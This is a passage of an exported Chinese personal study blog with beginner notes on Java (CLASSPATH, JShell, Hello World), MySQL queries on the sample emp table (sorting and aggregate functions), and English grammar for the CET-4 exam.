<p>​    如果说现在要想执行它，那么最简单的做法是直接设置一个类的加载路径，就直接告诉JVM，每一次进行类加载的时候你需要通过我设置的路径来进行“*.class”文件的加载（如果没有告诉JVM这个问题，则JVM会在当前所在的路径下进行加载）。</p>
<p><strong>范例：设置CLASSPATH</strong></p>
<p>设置命令：SET CLASSPATH=类加载路径</p>
<p>设置CLASSPATH： D:\yootk</p>
<p>CLASSPATH是一个系统的环境属性，在Windows系统里面，所有的环境属性都是通过”SET”命令实现的定义；</p>
<blockquote>
<p><strong>C:\Users\23242&gt;set classpath=D:\yootk</strong></p>
<p><strong>C:\Users\23242&gt;java Hello</strong><br><strong>Hello world!</strong></p>
</blockquote>
<p>此时就可以直接执行。</p>
<p>还原成默认形式</p>
<blockquote>
<p>SET classpath=.</p>
</blockquote>
<blockquote>
<p>D:\yootk&gt;java Hello<br>Hello world!</p>
</blockquote>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>知识拓展</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA代码集合</title>
    <url>/posts/16.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="JAVA代码集合"><a href="#JAVA代码集合" class="headerlink" title="JAVA代码集合"></a>JAVA代码集合</h1><p>1、</p>
<pre><code>public class Hello{
    public static void main(String args[]){
        System.out.println(&quot;Hello world!&quot;);
    }
}</code></pre><p>2、        </p>
<pre><code>public class DongJun{ 
    public static void main(String DongJun[]){
        //10是一个数字，既然已经定义好了10，那么就意味着这个内容无法修改了
        System.out.println(10); //常量
    }
}</code></pre><p>3、</p>
<pre><code>public class DongJun{ 
    public static void main(String DongJun[]){
        //所有程序语言最后一定要使用;作为结尾
        int age = 10;//定义一个整型变量，并且设置了默认值
        System.out.println(age); //输出变量内容
        age = 19; //赋值
        System.out.println(age); //输出变量内容
    }
}</code></pre><p>4、</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>知识拓展</tag>
      </tags>
  </entry>
  <entry>
    <title>JShell交互式工具</title>
    <url>/posts/8.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Jshell交互式工具"><a href="#Jshell交互式工具" class="headerlink" title="Jshell交互式工具"></a>Jshell交互式工具</h1><p>​    在Java的历史版本之中，实际上从来都没有过这种交互式工具的出现，但那是现在很多的开发语言里面都有交互式编程环境，这样可以便于程序的执行以及程序的简化操作，所以很多的新手是非常喜欢这种交互式编程模型的，于是在JDK 1.9（为什么JDK 1.8没有jshell命令？）之后，开发者只要配置好了JDK的PATH环境属性，那么就可以直接在命令行下面通过“jshell”命令启动交互式编程环境。</p>
<p><img src="https://img-blog.csdnimg.cn/20200921090545192.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>这种交互式的编程环境，仅仅是对一些开发的操作支持有了改善，但是从整体的角度来讲，于实际的项目开发还是由着非常大的茶杯，作为一个游戏的编程应用是非常不错的，但是如果要作为实际的开发，那么就太痛苦了，针对于JShell仅仅是简化了一些程序结构，那么如果有需要也可以将一些程序的代码直接定义在一些文本文件里面，现在“d:\yootk\yootknam.stat”.</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">System.out.println(&quot;Hello world!&quot;);</span><br><span class="line">System.out.println(&quot;技术学生：董先生&quot;);</span><br></pre></td></tr></table></figure></div>

<p>那么随后肯定是希望可以在jshell环境下main去加载这些文件中的代码，那么就可以通过一个”/open”的命令完成：</p>
<p><img src="https://img-blog.csdnimg.cn/20200921091153411.png#pic_center" alt="在这里插入图片描述"></p>
<p><strong>Jshell输入程序文件代码加载</strong></p>
<h1 id="JShell的退出"><a href="#JShell的退出" class="headerlink" title="JShell的退出"></a>JShell的退出</h1><p>如果已经打开了jshell交互式编程环境，并且突然后悔了，不想继续使用了那么此时你可以直接关闭窗口，或者输入退出命令“/exit”。</p>
<p><img src="https://img-blog.csdnimg.cn/20200921091407674.png#pic_center" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>知识拓展</tag>
      </tags>
  </entry>
  <entry>
    <title>MySql数据库</title>
    <url>/posts/5.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="表的结构"><a href="#表的结构" class="headerlink" title="表的结构"></a>表的结构</h1><blockquote>
<p>+——————-+<br>| Tables_in_dongjun |<br>+——————-+<br>| dept              |   （部门表）<br>| emp               |   （员工表）<br>| salgrade          |   （工资等级表）</p>
</blockquote>
<blockquote>
<p>表的结构mysql&gt; desc dept;<br>+——–+————-+——+—–+———+——-+<br>| Field  | Type        | Null | Key | Default | Extra |<br>+——–+————-+——+—–+———+——-+<br>| DEPTNO | int(2)      | NO   | PRI | NULL    |       |<br>| DNAME  | varchar(14) | YES  |     | NULL    |       |<br>| LOC    | varchar(13) | YES  |     | NULL    |       |<br>+——–+————-+——+—–+———+——-+</p>
</blockquote>
<p>表中的数据</p>
<blockquote>
<p>mysql&gt; select * from emp;<br>+——-+——–+———–+——+————+———+———+——–+<br>| EMPNO | ENAME  | JOB       | MGR  | HIREDATE   | SAL     | COMM    | DEPTNO |<br>+——-+——–+———–+——+————+———+———+——–+<br>|  7369 | SMITH  | CLERK     | 7902 | 1980-12-17 |  800.00 |    NULL |     20 |<br>|  7499 | ALLEN  | SALESMAN  | 7698 | 1981-02-20 | 1600.00 |  300.00 |     30 |<br>|  7521 | WARD   | SALESMAN  | 7698 | 1981-02-22 | 1250.00 |  500.00 |     30 |<br>|  7566 | JONES  | MANAGER   | 7839 | 1981-04-02 | 2975.00 |    NULL |     20 |<br>|  7654 | MARTIN | SALESMAN  | 7698 | 1981-09-28 | 1250.00 | 1400.00 |     30 |<br>|  7698 | BLAKE  | MANAGER   | 7839 | 1981-05-01 | 2850.00 |    NULL |     30 |<br>|  7782 | CLARK  | MANAGER   | 7839 | 1981-06-09 | 2450.00 |    NULL |     10 |<br>|  7788 | SCOTT  | ANALYST   | 7566 | 1987-04-19 | 3000.00 |    NULL |     20 |<br>|  7839 | KING   | PRESIDENT | NULL | 1981-11-17 | 5000.00 |    NULL |     10 |<br>|  7844 | TURNER | SALESMAN  | 7698 | 1981-09-08 | 1500.00 |    0.00 |     30 |<br>|  7876 | ADAMS  | CLERK     | 7788 | 1987-05-23 | 1100.00 |    NULL |     20 |<br>|  7900 | JAMES  | CLERK     | 7698 | 1981-12-03 |  950.00 |    NULL |     30 |<br>|  7902 | FORD   | ANALYST   | 7566 | 1981-12-03 | 3000.00 |    NULL |     20 |<br>|  7934 | MILLER | CLERK     | 7782 | 1982-01-23 | 1300.00 |    NULL |     10 |<br>+——-+——–+———–+——+————+———+———+——–+</p>
</blockquote>
<h1 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h1><p>（略）</p>
<h1 id="排序（升序、降序）"><a href="#排序（升序、降序）" class="headerlink" title="排序（升序、降序）"></a>排序（升序、降序）</h1><p>题目：按照工资升序排序，找出员工名和薪资。<br>select ename, sal from emp order by sal;</p>
<blockquote>
<p>+——–+———+<br>| ename  | sal     |<br>+——–+———+<br>| SMITH  |  800.00 |<br>| JAMES  |  950.00 |<br>| ADAMS  | 1100.00 |<br>| WARD   | 1250.00 |<br>| MARTIN | 1250.00 |<br>| MILLER | 1300.00 |<br>| TURNER | 1500.00 |<br>| ALLEN  | 1600.00 |<br>| CLARK  | 2450.00 |<br>| BLAKE  | 2850.00 |<br>| JONES  | 2975.00 |<br>| SCOTT  | 3000.00 |<br>| FORD   | 3000.00 |<br>| KING   | 5000.00 |</p>
</blockquote>
<p><strong>注意：默认是升序asc表示升序、desc表示降序</strong>  </p>
<p>select ename, sal from emp order by sal;<br>select ename, sal from emp order by sal asc; 指定升序<br>select ename, sal from emp order by sal desc; 指定降序</p>
<p>题目：按照工资的降序排列，当工资相同的时候再按照名字的升序排列。</p>
<p>select ename,sal from emp order by sal desc , ename asc;</p>
<blockquote>
<p>+——–+———+<br>| ename  | sal     |<br>+——–+———+<br>| KING   | 5000.00 |<br>| FORD   | 3000.00 |<br>| SCOTT  | 3000.00 |<br>| JONES  | 2975.00 |<br>| BLAKE  | 2850.00 |<br>| CLARK  | 2450.00 |<br>| ALLEN  | 1600.00 |<br>| TURNER | 1500.00 |<br>| MILLER | 1300.00 |<br>| MARTIN | 1250.00 |<br>| WARD   | 1250.00 |<br>| ADAMS  | 1100.00 |<br>| JAMES  |  950.00 |<br>| SMITH  |  800.00 |<br>+——–+———+</p>
</blockquote>
<p><strong>注意</strong>：越靠前的字段越能起到主导作用。只有当前面的字段无法完成排序的时候后，才会启用后面的字段。</p>
<p>select ename, sal from emp order by 2;</p>
<blockquote>
<p>+——–+———+<br>| ename  | sal     |<br>+——–+———+<br>| SMITH  |  800.00 |<br>| JAMES  |  950.00 |<br>| ADAMS  | 1100.00 |<br>| WARD   | 1250.00 |<br>| MARTIN | 1250.00 |<br>| MILLER | 1300.00 |<br>| TURNER | 1500.00 |<br>| ALLEN  | 1600.00 |<br>| CLARK  | 2450.00 |<br>| BLAKE  | 2850.00 |<br>| JONES  | 2975.00 |<br>| SCOTT  | 3000.00 |<br>| FORD   | 3000.00 |<br>| KING   | 5000.00 |<br>+——–+———+</p>
<p><strong>注意：</strong>“2”代表的是第几列。</p>
<p><strong>select * from emp order by 6;</strong></p>
<p>+——-+——–+———–+——+————+———+———+——–+<br>| EMPNO | ENAME  | JOB       | MGR  | HIREDATE   | SAL     | COMM    | DEPTNO |<br>+——-+——–+———–+——+————+———+———+——–+<br>|  7369 | SMITH  | CLERK     | 7902 | 1980-12-17 |  800.00 |    NULL |     20 |<br>|  7900 | JAMES  | CLERK     | 7698 | 1981-12-03 |  950.00 |    NULL |     30 |<br>|  7876 | ADAMS  | CLERK     | 7788 | 1987-05-23 | 1100.00 |    NULL |     20 |<br>|  7521 | WARD   | SALESMAN  | 7698 | 1981-02-22 | 1250.00 |  500.00 |     30 |<br>|  7654 | MARTIN | SALESMAN  | 7698 | 1981-09-28 | 1250.00 | 1400.00 |     30 |<br>|  7934 | MILLER | CLERK     | 7782 | 1982-01-23 | 1300.00 |    NULL |     10 |<br>|  7844 | TURNER | SALESMAN  | 7698 | 1981-09-08 | 1500.00 |    0.00 |     30 |<br>|  7499 | ALLEN  | SALESMAN  | 7698 | 1981-02-20 | 1600.00 |  300.00 |     30 |<br>|  7782 | CLARK  | MANAGER   | 7839 | 1981-06-09 | 2450.00 |    NULL |     10 |<br>|  7698 | BLAKE  | MANAGER   | 7839 | 1981-05-01 | 2850.00 |    NULL |     30 |<br>|  7566 | JONES  | MANAGER   | 7839 | 1981-04-02 | 2975.00 |    NULL |     20 |<br>|  7788 | SCOTT  | ANALYST   | 7566 | 1987-04-19 | 3000.00 |    NULL |     20 |<br>|  7902 | FORD   | ANALYST   | 7566 | 1981-12-03 | 3000.00 |    NULL |     20 |<br>|  7839 | KING   | PRESIDENT | NULL | 1981-11-17 | 5000.00 |    NULL |     10 |<br>+——-+——–+———–+——+————+———+———+——–+</p>
</blockquote>
<p><strong>建议写成</strong></p>
<p><strong>select * from emp order by sal;</strong></p>
<p>题目：找出工作岗位是salesman的员工，并且要求按照薪资的降序排列。</p>
<p><strong>select ename, sal, job from emp where job = ‘salesman’ order by sal desc;</strong></p>
<blockquote>
<p>+——–+———+———-+<br>| ename  | sal     | job      |<br>+——–+———+———-+<br>| ALLEN  | 1600.00 | SALESMAN |<br>| TURNER | 1500.00 | SALESMAN |<br>| WARD   | 1250.00 | SALESMAN |<br>| MARTIN | 1250.00 | SALESMAN |</p>
</blockquote>
<p><strong>语句格式与执行顺序</strong></p>
<blockquote>
<p>select</p>
<p>​    *     3</p>
<p>from  </p>
<p>​    tablename     1</p>
<p>where</p>
<p>​    条件      2</p>
<p>order by      4</p>
<p>​    ……</p>
</blockquote>
<p>order by 是最后执行的</p>
<p><strong>select ename,sal as salary from emp order by salary;</strong></p>
<blockquote>
<p>+——–+———+<br>| ename  | salary  |<br>+——–+———+<br>| SMITH  |  800.00 |<br>| JAMES  |  950.00 |<br>| ADAMS  | 1100.00 |<br>| WARD   | 1250.00 |<br>| MARTIN | 1250.00 |<br>| MILLER | 1300.00 |<br>| TURNER | 1500.00 |<br>| ALLEN  | 1600.00 |<br>| CLARK  | 2450.00 |<br>| BLAKE  | 2850.00 |<br>| JONES  | 2975.00 |<br>| SCOTT  | 3000.00 |<br>| FORD   | 3000.00 |<br>| KING   | 5000.00 |<br>+——–+———+</p>
</blockquote>
<h1 id="分组函数"><a href="#分组函数" class="headerlink" title="分组函数"></a><strong>分组函数</strong></h1><p>count 计数<br>sum 求和<br>avg 平均值<br>max 最大值<br>min 最小值</p>
<p>记住：所有分组的函数都是对“某一组”数据进行操作的。</p>
<p>题目：找出员工工资总和</p>
<p>select sum(sal) sal from emp;<br>select max(sal) sal from emp;<br>select min(sal) sal from emp;<br>select avg(sal) sal from emp;<br>select count(ename) ename from emp;</p>
<blockquote>
<p>+———+<br>| sal     |<br>+———+<br>| 5000.00 |<br>+———+<br>1 row in set (0.01 sec)</p>
<p>+——–+<br>| sal    |<br>+——–+<br>| 800.00 |<br>+——–+<br>1 row in set (0.00 sec)</p>
<p>+————-+<br>| sal         |<br>+————-+<br>| 2073.214286 |<br>+————-+<br>1 row in set (0.00 sec)</p>
<p>+——-+<br>| ename |<br>+——-+<br>|    14 |<br>+——-+</p>
</blockquote>
<p>分组函数一共五个，还有另一个名字：多行处理函数。<br>多行处理函数的特点：输入多行，最终输出的结果是一行。</p>
<p>分组函数自动忽略NULL。<br>select count(comm) from emp;</p>
<blockquote>
<p>+————-+<br>| count(comm) |<br>+————-+<br>|           4 |<br>+————-+</p>
</blockquote>
<h1 id="单行处理函数"><a href="#单行处理函数" class="headerlink" title="单行处理函数"></a>单行处理函数</h1><p><strong>输入一行，输出一行</strong></p>
<p>计算每个员工的年薪？<br>select ename, (sal+comm) * 12 as yearsal from emp;<br>重点：所有数据库明文规定只要有NULL参与运算的运算结果一定是NULL</p>
<p><strong>ifnull()</strong>空处理函数？<br>    ifnull(可能为NULL的数据，被当做什么处理)</p>
<p>select ename, (sal+(ifnull(comm,0))) * 12 as yearsal from emp;</p>
<blockquote>
<p>+——–+———-+<br>| ename  | yearsal  |<br>+——–+———-+<br>| SMITH  |  9600.00 |<br>| ALLEN  | 22800.00 |<br>| WARD   | 21000.00 |<br>| JONES  | 35700.00 |<br>| MARTIN | 31800.00 |<br>| BLAKE  | 34200.00 |<br>| CLARK  | 29400.00 |<br>| SCOTT  | 36000.00 |<br>| KING   | 60000.00 |<br>| TURNER | 18000.00 |<br>| ADAMS  | 13200.00 |<br>| JAMES  | 11400.00 |<br>| FORD   | 36000.00 |<br>| MILLER | 15600.00 |<br>+——–+———-+</p>
</blockquote>
<p>题目：找出工资高于平均工资的员工。</p>
<p>select ename, sal from emp where sal &gt; avg(sal);</p>
<p>报错：ERROR 1111 (HY000): Invalid use of group function</p>
<p>select avg(sal) from emp;</p>
<p>+————-+<br>| avg(sal)    |<br>+————-+<br>| 2073.214286 |<br>+————-+</p>
<p>SQL语法当中有一个语法规则，分组函数不可直接使用在where子句当中。</p>
<p> count(*)和count(具体的某个字段)，他们有什么区别？</p>
<p>​    count(*)：不是统计某个字段中数据的个数，而是统计总记录条数</p>
<p>​    count(comm)：表示统计comm字段中不为NULL的数据总数量。</p>
<p>select count(*) from emp;</p>
<p>select count(comm) from emp;</p>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>知识拓展</tag>
      </tags>
  </entry>
  <entry>
    <title>简单句的补充</title>
    <url>/posts/26.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="介词短语-介词-prep"><a href="#介词短语-介词-prep" class="headerlink" title="介词短语 -  介词  prep."></a><strong>介词短语 -  介词  prep.</strong></h1><blockquote>
<p><strong>时间</strong></p>
<p><strong>before      after</strong> </p>
<p><strong>since     until</strong></p>
<p><strong>during</strong></p>
<p><strong>位置</strong></p>
<p><strong>between（二者之间） among（三者及以上）</strong></p>
<p><strong>地点方位</strong></p>
<p><strong>across(横穿)     through(隧道)</strong></p>
<p><strong>against</strong></p>
<p><strong>like as</strong></p>
</blockquote>
<h1 id="非谓语动词"><a href="#非谓语动词" class="headerlink" title="非谓语动词"></a><u>非谓语动词</u></h1><ol>
<li><p><strong>doing（主动）</strong><br>Passing planes can be heard night and day.</p>
<p>The teacher came into the  classroom, holding a book in his hand.</p>
</li>
<li><p><strong>done（被动）</strong><br>He bought a used car.</p>
<p>The teacher came into the classroom, followed by five students.</p>
</li>
<li><p><strong>to do（目的）</strong><br>I am coming to see you.</p>
<p>I have a lot of homework to do.</p>
</li>
</ol>
<h1 id="同位语-插入语"><a href="#同位语-插入语" class="headerlink" title="同位语/插入语"></a>同位语/插入语</h1><p>My teacher, Mr.Lee, is coming to the meeting.</p>
<p>My teacher  together with his  colleagues is coming to the meeting.</p>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>英语四级</tag>
      </tags>
  </entry>
  <entry>
    <title>状语从句</title>
    <url>/posts/4.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="状语从句"><a href="#状语从句" class="headerlink" title="状语从句"></a>状语从句</h1><h2 id="状语从句含义"><a href="#状语从句含义" class="headerlink" title="状语从句含义"></a><strong>状语从句含义</strong></h2><p><strong>含义</strong>一个句子作状语，表达描述性的信息。</p>
<h2 id="状语从句写法"><a href="#状语从句写法" class="headerlink" title="状语从句写法"></a>状语从句写法</h2><p>一个完整的陈述句，前面加上<strong>从属连词</strong>（不作句子成分，他会表达逻辑关系，说清楚整个句子描述什么的）。</p>
<p>状语从句共分为9种，主要由<strong>从属连词</strong>来决定。</p>
<table>
<thead>
<tr>
<th></th>
<th>从属连词</th>
</tr>
</thead>
<tbody><tr>
<td>时间状语从句</td>
<td>when，while，as，（当……时候）<br />before，after，since，until<br />as soon as，no sooner……than（一……就）</td>
</tr>
<tr>
<td>地点状语从句</td>
<td>where</td>
</tr>
<tr>
<td>原因状语从句</td>
<td>because，since，as</td>
</tr>
<tr>
<td>结果状语从句</td>
<td>so/such…… that（太……所以）, so that…… （所以）</td>
</tr>
<tr>
<td>目的状语从句</td>
<td>so that……， in order that……</td>
</tr>
<tr>
<td>条件状语从句</td>
<td>if，unless，as long as</td>
</tr>
<tr>
<td>让步状语从句</td>
<td>although，though，even though，as</td>
</tr>
<tr>
<td>比较状语从句</td>
<td>than，as</td>
</tr>
<tr>
<td>方式状语从句</td>
<td>as</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>英语四级</tag>
      </tags>
  </entry>
  <entry>
    <title>定语从句</title>
    <url>/posts/2.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="复合句"><a href="#复合句" class="headerlink" title="复合句"></a>复合句</h1><p><strong>定语从句</strong></p>
<p>写法</p>
<p>先行词 =  ？ 关系词 =  ？<br>物   ——　which/that</p>
<p>人   ——    who/whom/that</p>
<p>人的/物的    ——　whose</p>
<p>时间     ——      when</p>
<p>地点    ——      where</p>
<p>原因    ——    why</p>
<p><strong>注意：</strong></p>
<ul>
<li>定语从句每一个关系词都作成分</li>
<li>which和that没有区别，可以互换</li>
<li>whom指人作宾语</li>
<li>who/that指人作任何成分</li>
<li>定语从句中关系词作宾语可以省略</li>
</ul>
<p>I lost the book which/that I borrowed from the library. </p>
<p>The woman I saw in the park was feeding pigeons.</p>
<p>The bus I take to school everyday is usually very crowded.</p>
<p><strong><em>定语从句分类</em></strong></p>
<p>名词范围不明确需要限定性：<br>I met your friend who is staying in Paris.</p>
<p>名词的范围明确，非限定性：<br>I met your mother,  who is staying in Paris.</p>
<blockquote>
<p>限定性从句<br>1、限定性的定语从句，名词范围不明确<br>2、无逗号隔开<br>3、不能省略</p>
<p>非限定性从句<br>1、名词的范围明确<br>2、有逗号隔开<br>3、可以省略不影响表达意思。<br>4、只能用which不用that<br>5、做宾语只能用whom</p>
</blockquote>
<p>如果关系词位于介词后，介词可以提前，提前就只能使用which.</p>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>英语四级</tag>
      </tags>
  </entry>
  <entry>
    <title>名词性从句</title>
    <url>/posts/1.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="复合句"><a href="#复合句" class="headerlink" title="复合句"></a>复合句</h1><p><strong>名词性从句</strong></p>
<ul>
<li><p><strong>主语从句</strong></p>
<p> Whether we will go camping depends on the weather.</p>
<p>It depends on the weather whether we will go camping.</p>
</li>
<li><p><strong>宾语从句</strong> （<strong>连接词 + 陈述句</strong>）<br><em>陈述句变宾语从句 You are right.</em><br>I know (that) you are right. (在宾语从句中That不做成分可以省略)</p>
<p><em>特殊疑问句变宾语从句 What will she say?</em><br>I know what she will say.(疑问变陈述句，主谓顺序)</p>
<p><em>一般疑问句变宾语从句 Is he happy?</em><br>I know whether/if he is happy.</p>
</li>
<li><p><strong>表语从句</strong><br>My concern is that people don’t care about others.</p>
<p>The question remains whether people will buy it.</p>
</li>
<li><p><strong>同位语从句</strong>（<strong>解释说明n.</strong>）</p>
<p>I have no doubt that he will help me.</p>
<p>I support the argument that the problem of school buses must be taken seriously.</p>
</li>
</ul>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>英语四级</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA编程起步</title>
    <url>/posts/6.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="具体内容"><a href="#具体内容" class="headerlink" title="具体内容"></a><strong>具体内容</strong></h1><p>​    Java是现在世界上最流行的编程语言，在服务器端的开发上保持着绝对的优势。例如： 你现在需要进行网购，如果要进行网购肯定要有网络服务器的支持，对于服务器代码的开发，首选的就是Java，实际上如果要考虑到编程语言特点的话，Java、C、C++实际上都是有着非常相似的语法结构，经过了多年的论述之后，这种语法结构是比较清晰的。</p>
<h1 id="认识Java"><a href="#认识Java" class="headerlink" title="认识Java"></a>认识Java</h1><p>​    Java是现在流行的语言，其前身就是OAK（橡树），实际上最初的OAK编程语言是为了一个GREEN的项目提供服务的，该项目主要是以Email实现对于家电产品的控制（所谓的“万物互联”，这也是早期物联网雏形），但是遗憾的是OAK并没有成功的获得Green项目，如果按照传统的思维模式，这种没有获得投资的项目基本上都属于废弃的产物了，可是在90年代初是属于互联网的时代，尤其是著名的网景公司，对于浏览器的开发非常的到位，于是就缔造了一个上市的神话。OAK吸收了网景公司的产品的想法，产生了一个Hot Java浏览器，一直到了1995年的时候才正式将OAK更名为JAVA，于是就一直延续到了今天，并且随着计算机硬件和网络发展，Java也在不带你的完善。</p>
<blockquote>
<p>友情提示：对于Java有如下几个核心的问题：</p>
<ul>
<li>​    如果要想判断一门语言的未来是否有持久性，最重要的指标就是在于其是否继续保持着更新，保持着最新的设计理念；</li>
<li>​    OAK实际上是使用C++开发出来的，但是相比较C++来讲结构上更加的清晰，所以：Java也是C++编写的；</li>
</ul>
<p>​    之所以叫OAK主要的原因在于语言的设计师的窗户外面有一颗数（橡树），后来原本是想把Java继续使用OAK，但是由于版权的问题，所以无法继续使用，最终这些开发工程师发现他们天天喝的咖啡味道不错（产自爪哇，于是使用了Java）</p>
<p>​    Java现在的版权属于Oracle公司，Oracle公司收购了早期的SUN公司。SUN（斯坦福的大学网络，Stanford University Network）公司，这家公司是一家从事与硬件技术的公司（它不是以软件为主，实际上在其被收购之前完全没有通过软件获得任何的利润），这家公司最著名的产品是小型机，并且大量的应用在亚马逊商城上，不过回来由于整个世界上的互联网低潮，SUN公司收到了极大的冲击，所以导致其并没有后续的强劲的生命力了，终于在2007年的时候被Oracle收购（Oracle收购SUN之前最想收购SUN公司是IBM）</p>
</blockquote>
<p>​    <strong>比较崩溃的问题</strong>，一个学生去面试（2007年的时候），面试官问他，请问你如何看待Oracle收购SUN的这一举动？<br>​    <strong>收购背后的故事</strong>，现在世界上有三大著名的软件产商：Microsoft、Oracle、Adobe，在商业领域上基本上就是微软（Microsoft）和甲骨文公司（Oracle），这两家公司是直接的竞争关系，但是在整个商业体系之中有四个重要的组成部分：操作系统、数据库、中间件、编程语言；</p>
<ul>
<li>Microsoft: Window Server、SQLServer、IIS、.NET;</li>
<li>Oracle：UNIX、Oracle Database、Bacteriologic(收购)、Java（收购）。</li>
</ul>
<p>吐槽：Oracle后来变成了“疯狗”，到处撕咬使用Java开发公司的版权费用，于是Google中招了。</p>
<p>​    任何的编程语言都有自己擅长和不擅长的领域，Java是一门非常庞大的语言，而且其设计的特点：大而全，相当于所有软件功能的实现都可以使用Java来完成，但是随着后来技术的发展，更多的编程技术出现了，于是很多的使用者就开始使用一些更加简单的语言来实现一些特定的功能，你现在可以见到的大量的会联网产品实际上都是Java开发的。</p>
<h3 id="Java语言特点"><a href="#Java语言特点" class="headerlink" title="Java语言特点"></a>Java语言特点</h3><p>​    既然Java语言如此的流行，肯定有自己不少独有的特嗲，于是一起分享一下，但是从客观的角度上来讲，Java在这么多年的历史发展中还是出想过许多疲软的时候后，由于技术的阻塞所以导致了许多的不足，但是后来由于版本不断的完善，以及变成语法的不断支持，java也成功的度过了这些疲软期，关键性的问题，Java是一个世界上最流行的编程语言，所以有着大量第三方软件厂商对其进行不断的完善。</p>
<p>​    早前的Java开发实际上分为三个方向：</p>
<ul>
<li><p>JavaSE（在2005年之前被称为”J2SE“）：主要是进行单机版程序的开发，例如：开发一些图形界面等；</p>
</li>
<li><p>JavaME（在2005年之前被称为“J2ME”）：主要是进行嵌入式设备的开发，最早期的在“诺基亚（Nokia）”被大量的应用在手机游戏的开发上，而后到了Android时代基本上就被替代掉了；</p>
</li>
<li><p>JavaEE（在2005年之前被称为“J2EE”）：主要进行企业平台的搭建，实际上现在许多的互联网就使用的是JavaEE在国内和国外，Java都是最为稳定的服务器端编程首先语言，那么既然是首先语言，就一起来分析它的一些特点：</p>
<ol>
<li><p>Java语言处采用标准的编程语法结构，所以语法结构清晰，而且语法也足够简单；<br><strong>补充</strong>：标准的编程语法结构虽然看起来结构清晰，但是会造成代码过多的问题，简单的特点是相比较C++来讲；</p>
</li>
<li><p>Java语言虽然使用了C++开发，但是其并没有引入C或C++那样的指针概念，而使用了更加直观的引用来解决内存处理问题，相当于不能够直接进行内存的操作。</p>
</li>
<li><p>Java是一门面向对象的编程语言，面向对象的编程模式是现代设计的主流，但是并不是所有的开发者都认为面向对象就是最佳的程序设计，很多的开发者依然觉得编写面向过程或者是使用函数式编程会更加的简单，但是毕竟是少数；</p>
</li>
</ol>
</li>
</ul>
<h1 id="编程起步"><a href="#编程起步" class="headerlink" title="编程起步"></a>编程起步</h1><p><strong>第一个代码</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">public class Hello&#123;</span><br><span class="line">	public static void main(String args[])&#123;</span><br><span class="line">		System.out.println(&quot;Hello world!&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>编译程序</strong>：javac Hello.java ——  <strong>解释程序</strong>：java Hello</p>
<p><strong>类结构</strong>：java是以类的形式运行的，所以任何的程序都必须放在一个类之中才可以执行，在java中进行类定义的时候有一个明确的要求，所有类的名称首字母必须大写，例如“<strong>D</strong>emo”、“<strong>Y</strong>ootk<strong>D</strong>emo”、“<strong>H</strong>ello<strong>D</strong>emo”，在java程序里面针对于类有两种定义模式：</p>
<p>​    <strong>形式一</strong>：public class类名称，此时要求文件名称和类名称保持一致，如果不一致则会出现编译错误，由于文件名称只有一个，所以在任何一个Java源代码程序文件里面只允许有一个public class 定义。、</p>
<p>当前程序的文件名称是“Hello.java”</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">public class Demo&#123;</span><br><span class="line">	public static void main(String args[])&#123;</span><br><span class="line">		System.out.println(&quot;Hello world!&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

